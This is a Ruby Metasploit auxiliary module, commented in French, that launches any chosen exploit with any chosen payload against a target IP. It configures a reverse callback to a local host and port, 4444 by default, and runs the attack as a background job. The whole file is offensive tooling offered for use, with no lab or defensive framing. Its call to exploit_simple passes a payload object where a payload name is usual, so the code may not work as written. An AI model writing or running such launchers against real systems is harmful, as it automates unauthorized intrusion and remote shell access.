#!/usr/bin/env ruby   # Shebang : indique que ce fichier est interprété par Ruby

require 'msf/core'    # Charge le cœur du framework Metasploit

# Définition du module
class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Automated Exploit Launcher',   # Nom affiché dans msfconsole
      'Description'    => %q{
        Automatically launches a chosen exploit with a specified payload against a target system.
      },
      'Author'         => ['TonNom'],   # Mets ton nom ou pseudo
      'License'        => MSF_LICENSE,
      'Actions'        => [
        ['Launch', { 'Description' => 'Launch exploit against target' }]
      ],
      'DefaultAction'  => 'Launch'
    ))

    # Déclaration des options configurables
    register_options(
      [
        OptAddress.new('RHOST', [true, 'Target IP address']),     # Adresse IP cible
        OptString.new('EXPLOIT', [true, 'Exploit module to use']),# Nom du module exploit
        OptString.new('PAYLOAD', [true, 'Payload to use']),       # Nom du payload
        OptAddress.new('LHOST', [true, 'Local IP for payload']),  # Adresse IP locale
        OptInt.new('LPORT', [true, 'Local port for payload', 4444]) # Port local
      ]
    )
  end

  # Méthode principale exécutée avec "run"
  def run
    rhost   = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost   = datastore['LHOST']
    lport   = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    # Crée une instance du module exploit choisi
    exploit = framework.exploits.create(exploit_name)
    if exploit.nil?
      print_error("Exploit #{exploit_name} not found.")
      return
    end

    # Configure les options de l'exploit
    exploit.datastore['RHOST'] = rhost

    # Crée une instance du payload choisi
    payload = framework.payloads.create(payload_name)
    if payload.nil?
      print_error("Payload #{payload_name} not found.")
      return
    end

    # Configure les options du payload
    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    # Lance l'exploit avec le payload
    exploit.exploit_simple(
      'Payload'        => payload,
      'LocalInput'     => self.user_input,
      'LocalOutput'    => self.user_output,
      'RunAsJob'       => true
    )

    print_status("Exploit launched against #{rhost}")
  end
end
